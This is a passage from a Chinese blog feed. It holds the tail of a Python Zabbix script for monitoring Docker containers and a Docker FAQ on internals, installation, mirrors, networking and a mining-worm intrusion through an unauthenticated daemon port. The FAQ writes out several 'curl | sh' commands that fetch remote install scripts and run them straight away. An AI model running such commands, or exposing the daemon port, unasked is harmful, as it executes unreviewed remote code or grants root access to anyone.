json.loads(json.dumps(inspect)) return s else: print('status err failed to obtain docker container inspect.') sys.exit(1) def docker_cpu(self, container): stats = self.docker_stats(container) inspect = self.docker_inspect(container) percpu_usage=stats['cpu_stats']['cpu_usage']['percpu_usage'] while 0 in percpu_usage:true percpu_usage.remove(0) cpu_num=float(len(percpu_usage)) total_cpu1 = stats['cpu_stats']['cpu_usage']['total_usage'] docker_system_usage1 = stats['cpu_stats']['system_cpu_usage'] stats = self.docker_stats(container) total_cpu2 = stats['cpu_stats']['cpu_usage']['total_usage'] docker_system_usage2 = stats['cpu_stats']['system_cpu_usage'] cpuDelta = float(total_cpu2) - float(total_cpu1) systemDelta = float(docker_system_usage2) - float(docker_system_usage1) daoke_cpu_num = str(str(self.client.inspect_container(str(container)))).split('DAOKECPU=')[-1].split("\'")[0] if cpuDelta &gt;= 0 and systemDelta &gt;= 0: if daoke_cpu_num == "&#123;u": daoke_cpu_num = 24 return round((float(cpuDelta)/float(systemDelta) * cpu_num * 100.0)/float(daoke_cpu_num), 2) elif daoke_cpu_num == "0": daoke_cpu_num = 24 return round((float(cpuDelta)/float(systemDelta) * cpu_num * 100.0)/float(daoke_cpu_num), 2) else: return round((float(cpuDelta)/float(systemDelta) * cpu_num * 100.0)/float(daoke_cpu_num), 2) else: return 0.0 def docker_mem(self, container, item): stats = self.docker_stats(container) if item == "total_cache": return stats['memory_stats']['stats']['total_cache'] elif item == "hierarchical_memory_limit": return stats['memory_stats']['stats']['hierarchical_memory_limit'] elif item == "hierarchical_memsw_limit": return stats['memory_stats']['stats']['hierarchical_memsw_limit'] elif item == "total_rss": return stats['memory_stats']['stats']['total_rss'] elif item == "total_swap": return stats['memory_stats']['stats']['total_swap'] elif item == 'mem_percent': return round(float(stats['memory_stats']['stats']['total_rss'])/float(stats['memory_stats']['limit'])*100.0, 2) def docker_networks(self, container, item): stats = self.docker_stats(container) try: stats['networks'] except Exception: return 0 if stats['networks']['eth0'] !=[]: tx_packets1 = stats['networks']['eth0']['tx_packets'] tx_bytes1 = stats['networks']['eth0']['tx_bytes'] rx_packets1 = stats['networks']['eth0']['rx_packets'] rx_bytes1 = stats['networks']['eth0']['rx_bytes'] stats = self.docker_stats(container) tx_packets2 = stats['networks']['eth0']['tx_packets'] tx_bytes2 = stats['networks']['eth0']['tx_bytes'] rx_packets2 = stats['networks']['eth0']['rx_packets'] rx_bytes2 = stats['networks']['eth0']['rx_bytes'] elif stats['networks']['bond0'] !=[]: tx_packets1 = stats['networks']['bond0']['tx_packets'] tx_bytes1 = stats['networks']['bond0']['tx_bytes'] rx_packets1 = stats['networks']['bond0']['rx_packets'] rx_bytes1 = stats['networks']['bond0']['rx_bytes'] stats = self.docker_stats(container) tx_packets2 = stats['networks']['bond0']['tx_packets'] tx_bytes2 = stats['networks']['bond0']['tx_bytes'] rx_packets2 = stats['networks']['bond0']['rx_packets'] rx_bytes2 = stats['networks']['bond0']['rx_bytes'] if "networks" in stats: if item == "tx_packets": return abs(tx_packets2 - tx_packets1) elif item == "tx_bytes": return abs(tx_bytes2 - tx_bytes1) elif item == "rx_packets": return abs(rx_packets2 - rx_packets1) elif item == "rx_bytes": return abs(rx_bytes2 - rx_bytes1) else: return 0 def docker_exec(self, container, cmd): client = docker.from_env() thread = "cat /proc/[0-9]*/status |grep Threads:|awk '&#123;sum += $2&#125;;END &#123;print sum&#125;'" fileopen = "find /proc/[0-9]* -type f 2&gt;/dev/null|wc -l" if cmd == "thread": cmd = thread elif cmd == "fileopen": cmd = fileopen try: result = client.containers.get(container).exec_run(['sh', '-c', cmd], stdin=True) except: raise Exception return result def docker_run(self, dockerimage, containername, cmd): client = docker.from_env() result = client.containers.run(image=dockerimage,stdin_open=True,tty=True,command=cmd,name=containername,detach=True) return result def docker_blkio(self, container, item): stats = self.docker_stats(container) blkio_bytes_stats = json.dumps(stats['blkio_stats']['io_service_bytes_recursive']) blkio_ops_stats = json.dumps(stats['blkio_stats']['io_serviced_recursive']) if stats['blkio_stats']['io_serviced_recursive'] !=[] and stats['blkio_stats']['io_serviced_recursive'] !=[]: if item == "blkio_stats": return stats['blkio_stats'] elif item == "io_bytes_read": return str(str(blkio_bytes_stats)).split('value\":')[1].split(",")[0] elif item == "io_bytes_write": return str(str(blkio_bytes_stats)).split('value\":')[2].split(",")[0] elif item == "io_ops_read": return str(str(blkio_ops_stats)).split('value\":')[1].split(",")[0] elif item == "io_ops_write": return str(str(blkio_ops_stats)).split('value\":')[2].split(",")[0] else: return 0if __name__ == "__main__": dockerService = DockerService() if len(sys.argv) &lt;= 1: print usage.__doc__ sys.exit(0) if sys.argv[1] == "docker.version": print dockerService.docker_version() elif sys.argv[1] == "docker.discovery": dockerService.docker_discovery() elif sys.argv[1] == "docker.up": print dockerService.docker_up(sys.argv[2]) elif sys.argv[1] == "docker.mem": print dockerService.docker_mem(sys.argv[2], sys.argv[3]) elif sys.argv[1] == "docker.cpu": print dockerService.docker_cpu(sys.argv[2]) elif sys.argv[1] == "docker.stats": print dockerService.docker_networks(sys.argv[2], sys.argv[3]) elif sys.argv[1] == "docker.exec": print dockerService.docker_exec(sys.argv[2], sys.argv[3]) elif sys.argv[1] == "docker.run": print dockerService.docker_run(sys.argv[2], sys.argv[3], sys.argv[4]) elif sys.argv[1] == "docker.blkio": print dockerService.docker_blkio(sys.argv[2], sys.argv[3]) 脚本测试 查看docker版本号 12$ ./zabbix_module_docker.py docker.version #输出docker版本号17.09.0-ce 运行一个容器 12$ ./zabbix_module_docker.py docker.run centos:7 test-container /bin/bash #用centos:7镜像run运行一个名称为test-container的容器&lt;Container: f04ebe73eb&gt; Discovery当前物理机上的容器 1234567891011$ ./zabbix_module_docker.py docker.discovery #discovery当前物理机上的容器情况&#123; "data":[ &#123; "&#123;#CONTAINERNAME&#125;":"test-container", "&#123;#CONTAINERID&#125;":"f04ebe73eb94305f27a14cee01495cf9fc3f10fd101127956b06d1cd1413d914" &#125; ]&#125; 查看容器状态 12$ ./zabbix_module_docker.py docker.up test-container #查看test-container容器当前状态，1代表up，0代表退出状态。1 结合zabbix可以用来自动发现实现批量监控docker容器，当然需要配置自定义zabbix监控项，可以通过配置zabbix监控模版关联主机。更详细的配置实现方式就不写了，网上有很多相关教程。]]></content>
      <categories>
        <category>系统运维</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Docker的50个问与答]]></title>
    <url>%2Fdocker%2FDocker_question%2F</url>
    <content type="text"><![CDATA[问：Docker 和 传统的虚拟机有什么差别？答： 我们知道inux系统将自身划分为两部分，一部分为核心软件，也称作内核空间(kernel)，另一部分为普通应用程序，这部分称为用户空间(userland)。容器内的进程是直接运行于宿主内核的，这点和宿主进程一致，只是容器的 userland 不同，容器的 userland 由容器镜像提供，也就是说镜像提供了 rootfs。假设宿主是 Ubuntu，容器是 CentOS。CentOS 容器中的进程会直接向 Ubuntu 宿主内核发送 syscall，而不会直接或间接的使用任何 Ubuntu 的 userland 的库。这点和虚拟机有本质的不同，虚拟机是虚拟环境，在现有系统上虚拟一套物理设备，然后在虚拟环境内运行一个虚拟环境的操作系统内核，在内核之上再跑完整系统，并在里面调用进程。还以上面的例子去考虑，虚拟机中，CentOS 的进程发送 syscall 内核调用，该请求会被虚拟机内的 CentOS 的内核接到，然后 CentOS 内核访问虚拟硬件时，由虚拟机的服务软件截获，并使用宿主系统，也就是 Ubuntu 的内核及 userland 的库去执行。而且，Linux 和 Windows 在这点上非常不同。Linux 的进程是直接发 syscall 的，而 Windows 则把 syscall 隐藏于一层层的 DLL 服务之后，因此 Windows 的任何一个进程如果要执行，不仅仅需要 Windows 内核，还需要一群服务来支撑，所以如果 Windows 要实现类似的机制，容器内将不会像 Linux 这样轻量级，而是非常臃肿。看一下微软移植的 Docker 就非常清楚了。所以不要把 Docker 和虚拟机弄混，Docker 容器只是一个进程而已，只不过利用镜像提供的 rootfs 提供了调用所需的 userland 库支持，使得进程可以在受控环境下运行而已，它并没有虚拟出一个机器出来。 Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。 问：如何安装 Docker？答： 很多人问到 docker, docker.io, docker-engine 甚至 lxc-docker 都有什么区别？其中，RHEL/CentOS 软件源中的 Docker 包名为 docker；Ubuntu 软件源中的 Docker 包名为 docker.io；而很古老的 Docker 源中 Docker 也曾叫做 lxc-docker。这些都是非常老旧的 Docker 版本，并且基本不会更新到最新的版本，而对于使用 Docker 而言，使用最新版本非常重要。另外，17.04 以后，包名从 docker-engine 改为 docker-ce，因此从现在开始安装，应该都使用 docker-ce这个包。正确的安装方法有两种： 一种是参考官方安装文档去配置 apt 或者 yum 的源； 另一种则是使用官方提供的安装脚本快速安装。 官方文档对配置源的方法已经有很详细的讲解:官方文档地址 17.04 及以后的版本安装方法：从 17.04 以后，可以用下面的命令安装。 12export CHANNEL=stablecurl -fsSL https://get.docker.com/ | sh -s -- --mirror Aliyun 这里使用的是官方脚本安装，通过环境变量指定安装通道为 stable，（如果喜欢尝鲜可以改为 edge, test），并且指定使用阿里云的源(apt/yum)来安装 Docker CE 版本。 17.03 及以前的版本安装方法：早期的版本可以使用阿里云或者 DaoCloud 老的脚本安装：使用阿里云的安装脚本： 1curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh - 使用DaoCloud的Docker安装脚本： 1curl -sSL https://get.daocloud.io/docker | sh Centos7机器直接用RPM包安装方法：可去阿里云寻找到最新的rpm包并下载安装：[阿里云docker rpm地址]:(https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/Packages/) 123wget https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/Packages/docker-ce-18.03.0.ce-1.el7.centos.x86_64.rpm -O docker-ce-18.03.0.ce-1.el7.centos.x86_64.rpmyum install -y container-selinuxyum -y localinstall docker-ce-18.03.0.ce-1.el7.centos.x86_64.rpm 问：Docker中使用了那些核心技术？答： Linux Namespace命名空间、Linux CGroup全称Linux Control Group控制组和 UnionFS 全称Union File System联合文件系统，三大技术支撑了目前 Docker 的实现，也是 Docker 能够出现的最重要原因。 Linux Namespace是Linux提供的一种内核级别环境隔离的方法。通过隔离要做到的效果是：如果某个 Namespace 中有进程在里面运行，它们只能看到该 Namespace 的信息，无法看到 Namespace 以外的东西。Linux 的命名空间机制提供了以下七种不同的命名空间，包括CLONE_NEWCGROUP、CLONE_NEWIPC、CLONE_NEWNET、CLONE_NEWNS、CLONE_NEWPID、CLONE_NEWUSER 和 CLONE_NEWUTS，通过这七个选项我们能在创建新的进程时设置新进程应该在哪些资源上与宿主机器进行隔离。这些 Namespace 基本上覆盖了一个程序运行所需的环境，保证运行在的隔离的 Namespace 中的，会让程序不会受到其他收到 Namespace程序的干扰。但不是所有的系统资源都能隔离，时间就是个例外，没有对应的 Namespace，因此同一台 Linux 启动的容器时间都是相同的。 名称 宏定义 隔离的内容 IPC CLONE_NEWIPC System V IPC, POSIX message queues (since Linux 2.6.19) Network CLONE_NEWNET network device interfaces, IPv4 and IPv6 protocol stacks, IP routing tables, firewall rules, the /proc/net and /sys/class/net directory trees, sockets, etc (since Linux 2.6.24) Mount CLONE_NEWNS Mount points (since Linux 2.4.19) PID CLONE_NEWPID Process IDs (since Linux 2.6.24) User CLONE_NEWUSER User and group IDs (started in Linux 2.6.23 and completed in Linux 3.8) UTS CLONE_NEWUTS Hostname and NIS domain name (since Linux 2.6.19) Cgroup CLONE_NEWCGROUP Cgroup root directory (since Linux 4.6) Linux CGroup是Linux内核用来限制，控制与分离一个进程组群的资源（如CPU、内存、磁盘输入输出等）。Linux CGroupCgroup 可​​​让​​​您​​​为​​​系​​​统​​​中​​​所​​​运​​​行​​​任​​​务​​​（进​​​程​​​）的​​​用​​​户​​​定​​​义​​​组​​​群​​​分​​​配​​​资​​​源​​​ — 比​​​如​​​ CPU 时​​​间​​​、​​​系​​​统​​​内​​​存​​​、​​​网​​​络​​​带​​​宽​​​或​​​者​​​这​​​些​​​资​​​源​​​的​​​组​​​合​​​。​​​您​​​可​​​以​​​监​​​控​​​您​​​配​​​置​​​的​​​ cgroup，拒​​​绝​​​cgroup 访​​​问​​​某​​​些​​​资​​​源​​​，甚​​​至​​​在​​​运​​​行​​​的​​​系​​​统​​​中​​​动​​​态​​​配​​​置​​​您​​​的​​​ cgroup。主要提供了如下功能： Resource limitation: 限制进程使用的资源上限，比如最大内存、文件系统缓存使用限制。 Prioritization: 优先级控制，比如：CPU利用和磁盘IO吞吐。 Accounting: 一些审计或一些统计，主要目的是为了计费。 Control: 挂起一组进程，或者重启一组进程。 前面说过，cgroups 是用来对进程进行资源管理的，因此 cgroup 需要考虑如何抽象这两种概念：进程和资源，同时如何组织自己的结构。cgroups中有几个非常重要的概念： task：任务，对应于系统中运行的一个实体，一般是指进程 subsystem：子系统，具体的资源控制器（resource class 或者 resource controller），控制某个特定的资源使用。比如 CPU 子系统可以控制 CPU 时间，memory 子系统可以控制内存使用量 cgroup：控制组，一组任务和子系统的关联关系，表示对这些任务进行怎样的资源管理策略 hierarchy：层级树，一系列 cgroup 组成的树形结构。每个节点都是一个 cgroup，cgroup 可以有多个子节点，子节点默认会继承父节点的属性。系统中可以有多个 hierarchy cgroups为每种可以控制的资源定义了一个子系统。典型的子系统介绍如下： Block IO（blkio)：限制块设备（磁盘、SSD、USB 等）的 IO 速率 CPU Set(cpuset)：限制任务能运行在哪些 CPU 核上 CPU Accounting(cpuacct)：生成 cgroup 中任务使用 CPU 的报告 CPU (CPU)：限制调度器分配的 CPU 时间 Devices (devices)：允许或者拒绝 cgroup 中任务对设备的访问 Freezer (freezer)：挂起或者重启 cgroup 中的任务 Memory (memory)：限制 cgroup 中任务使用内存的量，并生成任务当前内存的使用情况报告 Network Classifier(net_cls)：为 cgroup 中的报文设置上特定的 classid 标志，这样 tc 等工具就能根据标记对网络进行配置 Network Priority (net_prio)：对每个网络接口设置报文的优先级 perf_event：识别任务的 cgroup 成员，可以用来做性能分析 使用 cgroups 的方式有几种： 使用 cgroups 提供的虚拟文件系统，直接通过创建、读写和删除目录、文件来控制 cgroups 使用命令行工具，比如 libcgroup包提供的 cgcreate、cgexec、cgclassify 命令 使用 rules engine daemon 提供的配置文件 当然，systemd、lxc、docker 这些封装了 cgroups 的软件也能让你通过它们定义的接口控制 cgroups 的内容 在实践中，系统管理员一般会利用CGroup做下面这些事（有点像为某个虚拟机分配资源似的）： 隔离一个进程集合（比如：nginx的所有进程），并限制他们所消费的资源，比如绑定CPU的核。 为这组进程 分配其足够使用的内存 为这组进程分配相应的网络带宽和磁盘存储限制 限制访问某些设备（通过设置设备的白名单） UnionFS就是把不同物理位置的目录合并mount到同一个目录中UnionFS其实是一种为 Linux 操作系统设计的用于把多个文件系统『联合』到同一个挂载点的文件系统服务。 操作系统中，联合挂载（union mounting）是一种将多个目录结合成一个目录的方式，这个目录看起来就像包含了他们结合的内容一样。 联合文件系统的实现通常辅有“写时复制（CoW）”的实现技术，这样任何对于底层文件系统分层的更改都会被“向上拷贝”到文件系统的一个临时、工作、或高层的分层里面。这个可写的层然后可以被看做是一个“改动（diff）”，能将之应用到下层只读的层，而这些层很可能作为底层被很多容器的进程中共享。这是一个很重要的点。 而 AUFS 即 Advanced UnionFS 其实就是 UnionFS 的升级版，它能够提供更优秀的性能和效率。AUFS有所有Union FS的特性，把多个目录，合并成同一个目录，并可以为每个需要合并的目录指定相应的权限，实时的添加、删除、修改已经被mount好的目录。而且，他还能在多个可写的branch/dir间进行负载均衡。AUFS 作为联合文件系统，它能够将不同文件夹中的层联合（Union）到了同一个文件夹中，这些文件夹在 AUFS 中称作分支，整个『联合』的过程被称为联合挂载（Union Mount）AUFS 只是 Docker 使用的存储驱动的一种，除了 AUFS 之外，Docker 还支持了不同的存储驱动，包括 aufs、devicemapper、overlay2、zfs 和vfs等等，在最新的 Docker 中，overlay2 取代了 aufs 成为了推荐的存储驱动，但是在没有 overlay2 驱动的机器上仍然会使用 aufs作为 Docker 的默认驱动。 官方参考文档： https://docs.docker.com/storage/storagedriver/select-storage-driver/#supported-backing-filesystems 问：OCI、runC 、Containerd 、Docker-shim 是什么？他们之间有怎么样的关联？答：Open Container Initiative（OCI）是： OCI在2015年6月宣布成立，旨在围绕容器格式和运行时制定一个开放的工业化标准。OCI的目标是为了避免容器的生态分裂为“小生态王国”，确保一个引擎上构建的容器可以运行在其他引擎之上。这是实现容器可移植性至关重要的部分。只要Docker是唯一的运行时，它就是事实上的行业标准。但是随着可用（和采纳）和其他引擎，有必要从技术的角度上定义“什么是容器”，以便不同实现上可以达成最终的一致。 runC是： runC是从Docker的libcontainer中迁移而来的，实现了容器启停、资源隔离等功能。runC是一个轻量级的工具，它是用来运行容器的，只用来做这一件事，并且这一件事要做好。如果你了解过Docker引擎早期的历史，你应该知道当时启动和管理一个容器需要使用LXC工具集，然后在使用libcontainer。libcontainer就是使用类似cgroup和namespace一样的Linux内核设备接口编写的一小段代码，它是容器的基本构建模块。为了是过程更加简单，runC基本上是一个小命令行工具且它可以不用通过Docker引擎，直接就可以使用容器。这是一个独立的二进制文件，使用OCI容器就可以运行它。 Containerd是： Containerd是一个简单的守护进程，它可以使用runC管理容器，使用gRPC暴露容器的其他功能。相比较Docker引擎，使用gRPC，containerd暴露出针对容器的增删改查的接口，然而Docker引擎只是使用full-blown HTTP API接口对Images、Volumes、network、builds等暴露出这些方法。containerd向上为Docker Daemon提供了gRPC接口，使得Docker Daemon屏蔽下面的结构变化，确保原有接口向下兼容。向下通过containerd-shim结合runC，使得引擎可以独立升级，避免之前Docker Daemon升级会导致所有容器不可用的问题。 Docker-shim 是： docker-shim是一个真实运行的容器的真实垫片载体，每启动一个容器都会起一个新的docker-shim的一个进程，他直接通过指定的三个参数：容器id，boundle目录 。运行是二进制（默认为runc）来调用runc的api创建一个容器。 它们之间的关联关系： 我们ls看下主机上的Docker二进制文件，会发现有docker,dockerd,docker-containerd,docker-containerd-shim,和docker-containerd-ctr，docker-runc等。 123456789$ ls /usr/bin |grep dockerdockerdocker-containerddocker-containerd-ctrdocker-containerd-shimdockerddocker-initdocker-proxydocker-runc dockerd是docker engine守护进程，dockerd启动时会启动docker-containerd子进程。 dockerd与docker-containerd通过grpc进行通信。 docker-containerd-ctr是docker-containerd的cli。 docker-containerd通过docker-containerd-shim操作docker-runc，docker-runc真正控制容器生命周期 。 启动一个容器就会启动一个docker-containerd-shim进程。 docker-containerd-shim直接调用docker-runc的包函数。 真正用户想启动的进程由docker-runc的init进程启动，即runc init [args ...] 。 进程关系模型： 1234567docker ctr | | V Vdockerd -&gt; containerd ---&gt; shim -&gt; runc -&gt; runc init -&gt; process |-- &gt; shim -&gt; runc -&gt; runc init -&gt; process +-- &gt; shim -&gt; runc -&gt; runc init -&gt; process Docker引擎仍然管理者images，然后移交给containerd运行，containerd再使用runC运行容器。 Containerd只处理containers管理容器的开始，停止，暂停和销毁。由于容器运行时是孤立的引擎，引擎最终能够启动和升级而无需重新启动容器。 问：Docker pull 镜像如何加速？答：我们可以使用 Docker 镜像加速器来解决这个问题，加速器就是镜像、代理的概念。国内有不少机构提供了免费的加速器以方便大家使用，这里列出一些常用的加速器服务： Docker 官方的中国镜像加速器：从2017年6月9日起，Docker 官方提供了在中国的加速器，以解决墙的问题。不用注册，直接使用加速器地址：https://registry.docker-cn.com 即可。 中国科技大学的镜像加速器：中科大的加速器不用注册，直接使用地址https://docker.mirrors.ustc.edu.cn/配置加速器即可。进一步的信息可以访问：http://mirrors.ustc.edu.cn/help/dockerhub.html?highlight=docker 阿里云加速器：注册阿里云开发账户(免费的)后，访问这个链接就可以看到加速器地址： https://cr.console.aliyun.com/#/accelerator DaoCloud 加速器：注册 DaoCloud 账户(支持微信登录)，然后访问： https://www.daocloud.io/mirror#accelerator-doc当然你也可以自己搞个梯子。 问：如果 Docker 升级或者重启的话，那容器是不是都会被停掉然后重启啊？答：在 1.12 以前的版本确实如此，但是从 1.12 开始，Docker 引擎加入了 --live-restore 参数，使用该参数可以避免引擎升级、重启导致容器停止服务的情况。默认情况该功能不会被启动，如需启动，需要配置 docker 服务配置文件。比如 Centos 7.3 这类 systemd 的系统，可以修改 /usr/lib/systemd/system/docker.service 文件，在 ExecStart= 后面配置上 --live-restore： 123ExecStart=/usr/bin/dockerd \ --registry-mirror=https://registry.docker-cn.com \ --live-restore 上面的格式中使用了行尾 \ 的换行形式，这点和 bash 脚本一样，systemd 支持这种换行形式，如对此不了解可以先去学习 bash 程序设计。需要注意的是，--live-restore 和 Swarm Mode 不兼容，所以在集群环境中不要使用。实际上集群环境也不用担心某个服务器重启的问题，因为其上的服务都会被调度到别的节点上，因此服务并不会被中断。 官方参考文档： https://docs.docker.com/config/containers/live-restore/#enable-live-restore 问：服务器上线后，怎么发现总有个 xmrig 的容器在跑，删了还出来，这是什么鬼？警告！！你的服务器已经被入侵了！！ 答：有些人服务器上线后，发现突然多了一些莫名奇妙的容器在跑。比如下面这个例子： 1234$ docker ps -aIMAGE COMMAND CREATED STATUS PORTS NAMESlinuxrun/cpu2 "./xmrig --algo=cr...." 4 hours ago Exited (137) 7 minutes ago linuxrun-cpu2... 这就是有人在你的 Docker 宿主上跑了一个 xmrig 挖矿的蠕虫，因为你的系统被入侵了……。在你大叫 Docker 不安全之前，先检讨一下自己是不是做错了。检查一下 dockerd 引擎是否配置错误：ps -ef | grep dockerd，如果你看到的是这样子的： 12$ ps -ef | grep dockerd123 root 12:34 /usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375 如果在其中没有 --tlsverify 类的 TLS 配置参数，那就说明你将你的系统大门彻底敞开了。这是配置上严重的安全事故。 -H tcp://0.0.0.0:2375 是说你希望通过 2375/tcp 来操控你的 Docker 引擎，但是如果你没有加 --tlsverify 类的配置，就表明你的意图是允许任何人来操控你的 Docker 引擎，而 Docker 引擎是以 root 权限运行的，因此，你等于给了地球上所有人你服务器的 root 权限，而且还没密码。 如果细心一些，去查看 dockerd 的服务日志，journalctl -u docker，日志中有明确的警告，警告你这么配置是极端危险的： 1234$ journalctl -u docker...level=warning msg="[!] DON'T BIND ON ANY IP ADDRESS WITHOUT setting --tlsverify IF YOU DON'T KNOW WHAT YOU'RE DOING [!]"... 如果这些你都忽略了，那么被别人入侵就太正常了，是你自己邀请别人来的。所以，Docker 服务绑定端口，必须通过 TLS 保护起来，以后见到 -H tcp://....就要检查，是否同时配置了 --tlsverify，如果没看到，那就是严重错误了。这也是为什么推荐使用 docker-machine 进行 Docker 宿主管理的原因，因为 docker-machine 会帮你创建证书、配置 TLS，确保服务器的安全。 进一步如何配置 TLS 的信息，可以查看官网文档： https://docs.docker.com/engine/security/https/ 关于 docker-machine 的介绍，可以看官网文档： https://docs.docker.com/machine/overview/ 问：怎么固定容器 IP 地址？每次重启容器都要变化 IP 地址怎么办？答：一般情况是不需要指定容器 IP 地址的。这不是虚拟主机，而是容器。其地址是供容器间通讯的，容器间则不用 IP 直接通讯，而使用容器名、服务名、网络别名。 为了保持向后兼容，docker run 在不指定 --network 时，所在的网络是 default bridge，在这个网络下，需要使用 --link参数才可以让两个容器找到对方。 这是有局限性的，因为这个时候使用的是 /etc/hosts 静态文件来进行的解析，比如一个主机挂了后，重新启动IP可能会改变。虽然说这种改变Docker是可能更新/etc/hosts文件，但是这有诸多问题，可能会因为竞争冒险导致 /etc/hosts 文件损毁，也可能还在运行的容器在取得 /etc/hosts 的解析结果后，不再去监视该文件是否变动。种种原因都可能会导致旧的主机无法通过容器名访问到新的主机。 参考官网文档： https://docs.docker.com/engine/userguide/networking/default_network/dockerlinks/ 如果可能不要使用这种过时的方式，而是用下面说的自定义网络的方式。 而对于新的环境（Docker 1.10以上），应该给容器建立自定义网络，同一个自定义网络中，可以使用对方容器的容器名、服务名、网络别名来找到对方。这个时候帮助进行服务发现的是Docker 内置的DNS。所以，无论容器是否重启、更换IP，内置的DNS都能正确指定到对方的位置。参考官网文档： https://docs.docker.com/engine/userguide/networking/work-with-networks/#linking-containers-in-user-defined-networks 问：如何修改容器的 /etc/hosts 文件？答：容器内的 /etc/hosts 文件不应该被随意修改，如果必须添加主机名和 IP 地址映射关系，应该在 docker run 时使用 --add-host 参数，或者在 docker-compose.yml 中添加 extra_hosts 项。 不过在用之前，应该再考虑一下真的需要修改 /etc/hosts 么？如果只是为了容器间互相访问，应该建立自定义网络，并使用 Docker 内置的 DNS 服务。 问：怎么映射宿主端口？Dockerfile 中的EXPOSE和 docker run -p 有啥区别？答：Docker中有两个概念，一个叫做 EXPOSE ，一个叫做 PUBLISH 。 EXPOSE 是镜像/容器声明要暴露该端口，可以供其他容器使用。这种声明，在没有设定 --icc=false的时候，实际上只是一种标注，并不强制。也就是说，没有声明 EXPOSE 的端口，其它容器也可以访问。但是当强制 --icc=false 的时候，那么只有 EXPOSE 的端口，其它容器才可以访问。 PUBLISH 则是通过映射宿主端口，将容器的端口公开于外界，也就是说宿主之外的机器，可以通过访问宿主IP及对应的该映射端口，访问到容器对应端口，从而使用容器服务。 EXPOSE 的端口可以不 PUBLISH，这样只有容器间可以访问，宿主之外无法访问。而 PUBLISH 的端口，可以不事先 EXPOSE，换句话说 PUBLISH 等于同时隐式定义了该端口要 EXPOSE。 docker run 命令中的 -p, -P 参数，以及 docker-compose.yml 中的 ports 部分，实际上均是指 PUBLISH。 小写 -p 是端口映射，格式为 [宿主IP:]&lt;宿主端口&gt;:&lt;容器端口&gt;，其中宿主端口和容器端口，既可以是一个数字，也可以是一个范围，比如：1000-2000:1000-2000。对于多宿主的机器，可以指定宿主IP，不指定宿主IP时，守护所有接口。 大写 -P则是自动映射，将所有定义 EXPOSE 的端口，随机映射到宿主的某个端口。 问：我要映射好几百个端口，难道要一个个 -p 么？答： -p 是可以用范围的： 1-p 8001-8010:8001-8010 问：为什么 -p 后还是无法通过映射端口访问容器里面的服务？答： 首先，当然是检查这个 docker 的容器是否启动正常： docker ps、docker top &lt;容器ID&gt;、docker logs &lt;容器ID&gt;、docker exec -it &lt;容器ID&gt; bash等，这是比较常用的排障的命令；如果是 docker-compose 也有其对应的这一组命令，所以排障很容易。 如果确保服务一切正常，甚至在容器里，可以访问到这些服务，docker ps 也显示出了端口映射成功，那么就需要检查防火墙了。 问：如何让一个容器连接两个网络？答：如果是使用 docker run，那很不幸，一次只可以连接一个网络，因为 docker run 的 --network 参数只可以出现一次（如果出现多次，最后的会覆盖之前的）。不过容器运行后，可以用命令 docker network connect 连接多个网络。假设我们创建了两个网络： 12$ docker network create mynet1$ docker network create mynet2 然后，我们运行容器，并连接这两个网络。 12$ docker run -d --name web --network mynet1 nginx$ docker network connect mynet2 web 但是如果使用 docker-compose 那就没这个问题了。因为实际上，Docker Remote API 是支持一次性指定多个网络的，但是估计是命令行上不方便，所以 docker run 限定为只可以一次连一个。docker-compose 直接就可以将服务的容器连入多个网络，没有问题。 12345678910version: '2'services: web: image: nginx networks: - mynet1 - mynet2networks: mynet1: mynet2: 问：Docker 多宿主网络怎么配置？答：Docker 跨节点容器网络互联，最通用的是使用 overlay 网络。一代 Swarm 已经不再使用，它要求使用 overlay网络前先准备好分布式键值库，比如 etcd, consul 或 zookeeper。然后在每个节点的 Docker 引擎中，配置 --cluster-store 和 --cluster-advertise 参数。这样才可以互连。现在都在使用二代 Swarm，也就是 Docker Swarm Mode，非常简单，只要 docker swarm init 建立集群，其它节点 docker swarm join加入集群后，集群内的服务就自动建立了 overlay 网络互联能力。 需要注意的是，如果是多网卡环境，无论是 docker swarm init 还是 docker swarm join，都不要忘记使用参数 --advertise-addr 指定宣告地址，否则自动选择的地址很可能不是你期望的，从而导致集群互联失败。格式为 --advertise-addr &lt;地址&gt;:&lt;端口&gt;，地址可以是 IP地址，也可以是网卡接口，比如 eth0。端口默认为 2377，如果不改动可以忽略。 此外，这是供服务使用的 overlay，因此所有 docker service create 的服务容器可以使用该网络，而 docker run 不可以使用该网络，除非明确该网络为 --attachable。 关于overlay 网络的进一步信息，可以参考官网文档： https://docs.docker.com/engine/userguide/networking/get-started-overlay/ 虽然默认使用的是 overlay 网络，但这并不是唯一的多宿主互联方案。Docker 内置了一些其它的互联方案，比如效率比较高的 macvlan。如果在局域网络环境下，对 overlay 的额外开销不满意，那么可以考虑 macvlan 以及 ipvlan，这是比较好的方案。 https://docs.docker.com/engine/userguide/networking/get-started-macvlan/ 此外，还有很多第三方的网络可以用来进行跨宿主互联，可以访问官网对应文档进一步查看： https://docs.docker.com/engine/extend/legacy_plugins/#/network-plugins 问：明明 docker network ls 中看到了建立的 overlay 网络，怎么 docker run 还说网络不存在啊？答： 如果在 docker network ls 中看到了如下的 overlay 网络： 1234NETWORK ID NAME DRIVER SCOPE...24pz359114y0 mynet overlay swarm... 那么这个名为 mynet 的网络是不可以连接到 docker run 的容器。如果试图连接则会出现报错。如果是 1.12 的系统，会看到这样报错信息： 123$ docker run --rm --network mynet busyboxdocker: Error response from daemon: network mynet not found.See 'docker run --help'. 报错说 mynet 网络找不到。其实如果仔细观察，会看到这个名为 mynet 的网络，驱动是 overlay 没有错，但它的 Scope 是 swarm。这个意思是说这个网络是在二代 Swarm 环境中建立的 overlay 网络，因此只可以由 Swarm 环境下的服务容器才可以使用。而 docker run所运行的只是零散的容器，并非 Service，因此自然在零散容器所能使用的网络中，不存在叫 mynet 网络。 docker run 可以使用的 overlay 网络是 Scope 为 global 的 overlay 网络，也就是使用外置键值库所建立的 overlay 网络，比如一代 Swarm 的 overlay 网络。 这点在 1.13 后稍有变化。如果是 1.13 以后的系统，会看到这样的信息： 123$ docker run --rm --network mynet busyboxdocker: Error response from daemon: Could not attach to network mynet: rpc error: code = 7 desc = network mynet not manually attachable. 